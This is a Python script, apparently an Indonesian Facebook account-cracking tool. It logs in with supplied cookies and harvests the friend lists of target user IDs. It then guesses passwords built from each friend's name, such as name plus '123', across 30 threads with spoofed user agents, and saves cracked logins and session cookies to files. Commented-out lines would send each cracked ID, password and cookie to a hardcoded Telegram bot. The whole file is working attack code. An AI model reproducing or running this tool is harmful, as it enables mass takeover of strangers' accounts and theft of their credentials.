#!/usr/bin/python3
# -*- coding: utf-8 -*-

#━━━━━━━━━━━[ IMPORT ]━━━━━━━━━━━#
import requests,bs4,json,os,sys,random,datetime,time,re,platform,uuid
import urllib3,rich,base64
from rich.console import Console
from rich.panel import Panel
from bs4 import BeautifulSoup as sop	
from concurrent.futures import ThreadPoolExecutor as Xyraa
from rich import print as cetak
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn

#━━━━━━━━━━━[  VARIABLE ]━━━━━━━━━━━#
uid,pwpluss,pwnya,ugen,id,id2,method,pwv=[],[],[],[],[],[],[],[]
loop,ok,cp,a2f=0,0,0,0
rc=random.choice
rr=random.randint
ses = requests.Session()

#━━━━━━━━━━━[ PEWARNA DEF ]━━━━━━━━━━━#
A = '\x1b[1;97m' ;R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;48m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;46m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'

#━━━━━━━━━━━[ TAMBAHAN DEF ]━━━━━━━━━━━#
def clear():os.system('clear')
def back():main()
def linex():print(f'{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
#━━━━━━━━━━━[ USERAGENT REGULAR ]━━━━━━━━━━━#
###-----[ BAGIAN USERAGENT ]-----###
for firman in range(10000):
	rr = random.randint; rc = random.choice
	versi_android = random.choice(['2','3','4','4.0.4','4.1.1','4.1.2','4.2.2','5','5.0','5.0.2','5.1.1','6','6.0','6.0.1','7','7.0','8','8.0.0','8.1','4.3','5.0','7.0','7.0.1','8.1.0','6.0.1;','10','11','12','13','14'])
	chrome = random.choice(['87.0.4280.101','106.0.5249.126','55.0.2883.91','79.0.3945.116','92.0.4515.159','96.0.4664.45','92.0.4515.131','91.0.4472.101','91.0.4472.120','90.0.4430.91','51.0.2704.91','78.0.3904.108','107.0.5304.54','112.0.5615.48','73.0.3683.90','85.0.4183.127','85.0.4183.101','83.0.4103.106','85.0.4183.101','83.0.4103.106','74.0.3729.157','80.0.3987.162','80.0.3987.149','78.0.3904.108','112.0.0.0','113.0.5672.162','108.0.0.0','88.0.4324.141','92.0.4515.159','104.0.5112.97','61.0.3163.98','114.0.0.0','72.0.3626.76','37.0.0.0','47.0.2526.100','42.0.2311.111','69.0.3497.100'])
	model_bulid = random.choice(['CPH1853 Build/OPM1.171019.026; wv)','vivo 1612 Build/NRD90M; wv)','V2204 Build/SP1A.210812.003; wv)','vivo 1904 Build/RP1A.200720.012; wv)','V2207 Build/SP1A.210812.003; wv)','CPH1909 Build/O11019; wv)','CPH2591 Build/TP1A.220905.001; wv)','CPH2269 Build/RP1A.200720.011; wv)','21061119DG Build/RP1A.200720.011; wv)','Redmi 4A Build/N2G47H)','Redmi 5A Build/N2G47H)','M2006C3MG Build/QP1A.190711.020; wv)','M2010J19SC Build/QKQ1.200830.002; wv)','Redmi Note 8 Build/QKQ1.200114.002; wv)','220333QAG Build/RKQ1.211001.001; wv)','SM-G532G Build/MMB29T)','SM-J200H Build/LMY48B)','SM-J710F Build/NRD90M; wv)','SM-G610F Build/NRD90M)','SM-A107M Build/QP1A.190711.020; wv)','SM-A205U Build/PPR1.180610.011; wv)','SM-A215U Build/RP1A.200720.012; wv)'])
	browser = random.choice(['OPR/53.2.2254.55976','HeyTapBrowser/45.10.5.1.1','[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]','YaApp_Android/9.85 YaSearchBrowser/9.85','[FB_IAB/FB4A;FBAV/405.0.0.23.72;]','SznProhlizec/10.1.2a','XiaoMi/MiuiBrowser/12.11.0-gn','GoogleApp/14.34.24.28.arm64','VivoBrowser/8.7.0.1'])
	firman = f"Mozilla/5.0 (Linux; Android {versi_android}; {model_bulid} AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome} Mobile Safari/537.36"
	firzah = random.choice([firman])
	ugen.append(firzah)
	
def generate_user_agent():
    rr = random.randint
    aZ = random.choice('ABCDEFGHIJKLMNOPQRSTUVWALAMGIR')
    rx = random.randrange(1, 999)
    return f'Mozilla/5.0 (Windows NT {rr(9, 11)}; Win64; x64){aZ}{rx}{aZ}) AppleWebKit/537.36 (KHTML, like Gecko){rr(99, 149)}.0.{rr(4500, 4999)}.{rr(35, 99)} Chrome/{rr(99, 175)}.0.{rr(0, 5)}.{rr(0, 5)} Safari/537.36'
#━━━━━━━━━━━[ LOGO DEF ]━━━━━━━━━━━#
logo=(f"""{A}  ⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣤⣶⠶⠶⣶⣤⣤⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣴⠾⠛⠉⠀⢠⣾⣴⡾⠛⠻⣷⣄⠀⠀⠀⠀⠀
⠀⠀⢶⣶⣶⣿⣁⠀⠀⠀⠀⢸⣿⠏⢀⣤⣶⣌⠻⣦⡀⠀⠀⠀
⠀⠀⣴⡟⠁⢉⣙⣿⣦⡀⠀⢸⡏⣴⠟⢡⣶⣿⣧⡹⣷⡀⠀⠀
⠀⣼⠏⢀⣾⠟⠛⠛⠻⣿⡆⠀⠀⢿⣄⠀⠙⠉⠹⣷⡸⣷⠀⠀
⢠⣿⠀⢸⡿⢿⠇⠀⠀⣾⠇⠀⣀⣈⠻⢷⣤⣤⣤⡾⠃⢹⣇⠀
⢸⣿⠀⢸⣧⣀⣀⣠⣾⢋⣴⢿⣿⡛⠻⣶⣤⣉⠁⠀⠀⠀⣿⠀
⠈⣿⠀⠀⠙⠛⠛⠋⠁⣼⣯⣀⣿⠿⠶⠟⠉⠛⢷⣄⠀⠀⣿⡇
⠀⣿⠀⠀⠀⠀⠀⠀⠀⣿⡏⠉⠁⠀⠀⢀⣴⢶⣄  ⢻⡇  ⢸⡇
⠀⢻⣇⠀⠀⠀⠀⠀⢠⡿⢀⣀⢠⣾⠷⣾⣧⡶⠿⠟⠁⠀⣾⡇
⠀⠈⣿⣧⡀⠀⠀⣠⣿⣷⠟⢻⣿⣷⡾⠛⠉⠀⠀⠀⠀⢀⣿⠀
⠀⠀⢹⣿⢻⣦⡀⠉⠛⠛⠛⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⣼⠏⠀
⠀⠀⠀⠛⠀⠈⠻⠷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠟⠀⠀\n  """)
        
#━━━━━━━━━━━[ LOGIN DEF ]━━━━━━━━━━━#
def login_cok():
	try:
		clear()
		Console(width=50, style="bold green").print(Panel("[italic white]Masukan Cookies Facebook, Jangan Menggunakan Akun [italic green]Pribadi [white],Jika Gagal Login Gunakan Akun Lama [italic red]Contoh Uid Cookies [white]: [italic green]100028372637278 ",subtitle="",subtitle_align="left"));cok = Console().input("[bold green]   > ")
		open('.cok.txt','w').write(cok)
		with requests.Session() as r:
			try:
				r.headers.update({'Accept-Language': 'id,en;q=0.9','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36','Referer': 'https://www.instagram.com/','Host': 'www.facebook.com','Sec-Fetch-Mode': 'cors','Accept': '*/*','Connection': 'keep-alive','Sec-Fetch-Site': 'cross-site','Sec-Fetch-Dest': 'empty','Origin': 'https://www.instagram.com','Accept-Encoding': 'gzip, deflate',})
				response = r.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cok})
				if  '"access_token":' in str(response.headers):
					token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1);open('.tok.txt','w').write(token)
				else:Console(width=50, style="bold green").print(Panel("[italic red]Cookies Invalid...[italic white]"));exit()
			except Exception as e:print(e);exit()
		Console(width=50, style="bold green").print(Panel("[italic white]Login Berhasil[italic white]"))
		time.sleep(2);exit()
	except Exception as e:os.system('rm -rf .cok.txt');os.system('rm -rf .tok.txt');print(e);exit()
	
           #━━━━━━━━━━━[ MENU DEF ]━━━━━━━━━━━#
def Start():
	try:
		token = open('.tok.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Cookies Kadaluarsa ')
		os.system("rm -f .token.txt && .cookies.txt")
		time.sleep(5)
		login_cok()
	clear();print(logo)
	dump_massal()
	
              #━━━━━━━━━━━[ MASSAL DEF ]━━━━━━━━━━━#
def dump_massal():
	try:
		token = open('.tok.txt','r').read()
		cok = open('.cok.txt','r').read()
	except (IOError,KeyError,FileNotFoundError):
		Console(width=50, style="bold green").print(Panel("[bold red]Cookies Anda Sudah Kedaluwarsa/Mati. Silahkan Login Ulang...[italic white]"))
		login_cok()
	try:
		xx = input(f"{A}- Input Uid : {G}")
	except ValueError:
		print(f"{A}- Input Yang Dimasukan Salah")
		exit()
	if str(xx) == '':
		print(f"{A}- Gagal Dump {R}UID {A}Kemungkinan Private")
		exit()
	ses = requests.Session()
	jumlah = xx.split(',')
	for xmx in jumlah:
		uid.append(xmx)
	for user in uid:
		try:
			url = ses.get(f"https://graph.facebook.com/{user}?fields=friends&access_token={token}",cookies = {'cookies':cok}).json()
			for x in url['friends']['data']:
				try:
					id.append(x['id']+'|'+x['name'])
				except:continue
		except (KeyError,IOError):pass
	try:
		setting()
	except requests.exceptions.ConnectionError:print(f"{A}Tidak Ada Koneksi Internet");exit()
        
          #━━━━━━━━━━━[ SETTING DEF ]━━━━━━━━━━━#
def setting():
	
	passwrd()

              #━━━━━━━━━━━[ PASSWORD DEF ]━━━━━━━━━━━#
def passwrd():
	for bacot in id:
		xx = random.randint(0,len(id2))
		id2.insert(xx,bacot)
	linex()
	global prog,des
	prog = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with Xyraa(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(" ")[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(frs+'12')
						pwv.append(frs+'123')
						pwv.append(frs+'321')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+ '123')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'12')
						pwv.append(frs+'123')
						pwv.append(frs+'321')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+ '123')
				if 'crack' in method:
					pool.submit(validate,idf,pwv)
				else:
					pool.submit(validate,idf,pwv)
		
                #━━━━━━━━━━━[ REGULAR DEF ]━━━━━━━━━━━#
def validate(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[bold white]{(loop)}/{len(id)}[/] [green]OK:[green]{(ok)}[/] [yellow]CP:[yellow]{(cp)}')
	prog.advance(des)
	pro = rc(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			link = ses.get('https://web.facebook.com/login/?next=https%3A%2F%2Fbusiness.facebook.com%2Fbusiness%2Funifiedfblogin%2Fcallback%2F%3Fnext%3Dhttps%253A%252F%252Fbusiness.facebook.com%252Fbusiness%252Fmarketing%252Ffacebook%253Fbiz_login_source%253Dbiz_unified_f3_fb_login_button%2526join_id%253D68c090a3-9da1-4d2b-9be9-efd62a5e0316%26f3_request_id%3Da759524e-2161-4d62-bd68-1c6db2653ea5&request_id=a759524e-2161-4d62-bd68-1c6db2653ea5&_rdc=1&_rdr').text
			headers = {
'Host': 'web.facebook.com',
'content-length': '647',
'cache-control': 'max-age=0',
'dpr': '2',
'viewport-width': '980',
'sec-ch-ua': 'Not-A.Brand;v=99, Chromium;v=124',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': 'Linux',
'sec-ch-ua-full-version-list': 'Not-A.Brand;v=99.0.0.0, Chromium;v=124.0.6327.4',
'sec-ch-prefers-color-scheme': 'light',
'upgrade-insecure-requests': '1',
'origin': 'https://web.facebook.com',
'content-type': 'application/x-www-form-urlencoded',
'user-agent': pro,
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'navigate',
'sec-fetch-user': '?1',
'sec-fetch-dest': 'document',
'referer': 'https://web.facebook.com/login/?next=https%3A%2F%2Fbusiness.facebook.com%2Fbusiness%2Funifiedfblogin%2Fcallback%2F%3Fnext%3Dhttps%253A%252F%252Fbusiness.facebook.com%252Fbusiness%252Fmarketing%252Ffacebook%253Fbiz_login_source%253Dbiz_unified_f3_fb_login_button%2526join_id%253D68c090a3-9da1-4d2b-9be9-efd62a5e0316%26f3_request_id%3Da759524e-2161-4d62-bd68-1c6db2653ea5&request_id=a759524e-2161-4d62-bd68-1c6db2653ea5&_rdc=1&_rdr',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
}
			data = {
    'jazoest': re.search('name="jazoest" value="(.*?)"', str(link)).group(1),
    'lsd': re.search('name="lsd" value="(.*?)"', str(link)).group(1),
    'display': '',
    'isprivate': '',
    'return_session': '',
    'skip_api_login': '',
    'signed_next': '',
    'trynum': '1',
    'timezone': '-420',
    'lgndim': 'eyJ3IjozNjAsImgiOjc2MCwiYXciOjM2MCwiYWgiOjc2MCwiYyI6MjR9',
    'lgnrnd': '033013_kKS1',
    'lgnjs': '1735126214',
    'email': idf,
    'prefill_contact_point': idf,
    'prefill_source': '',
    'prefill_type': '',
    'first_prefill_source': '',
    'first_prefill_type': '',
    'had_cp_prefilled': 'false',
    'had_password_prefilled': 'false',
    'pass': pw,
}
			po = ses.post('https://web.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fbusiness.facebook.com%2Fbusiness%2Funifiedfblogin%2Fcallback%2F%3Fnext%3Dhttps%253A%252F%252Fbusiness.facebook.com%252Fbusiness%252Fmarketing%252Ffacebook%253Fbiz_login_source%253Dbiz_unified_f3_fb_login_button%2526join_id%253D68c090a3-9da1-4d2b-9be9-efd62a5e0316%26f3_request_id%3Da759524e-2161-4d62-bd68-1c6db2653ea5&lwv=100&request_id=a759524e-2161-4d62-bd68-1c6db2653ea5',headers=headers,data=data,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict():
				ok+=1
				coki= po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{G1}[{B}OK{G1}] {idf}{A}|{G1}{pw}{A}|{G1}{kuki}{A}|{G1}{pro}')
				#requests.post(f"https://api.telegram.org/bot7858153099:AAGO1QR21zy2sqVW9K8hIlnPz7vxQ1LzqHg/sendMessage?chat_id=5175475380&text={idf}|{pw}|{kuki}")
				open('OK/'+'stor.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
				break			
			elif "checkpoint" in po.cookies.get_dict():
				cp+=1
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				print(f'\r{Y}[{B}CP{Y}] {idf}{A}|{Y}{pw}{A}|{Y}{pro}')
				#requests.post(f"https://api.telegram.org/bot7858153099:AAGO1QR21zy2sqVW9K8hIlnPz7vxQ1LzqHg/sendMessage?chat_id=5175475380&text={idf}|{pw}")
				open('CP/'+'stor.txt','a').write(idf+'|'+pw+'|'+'\n')
				break			
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#━━━━━━━━━━━[ SYSTEM CONTROL ]━━━━━━━━━━━#	
def sabun():
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	Start()
sabun()

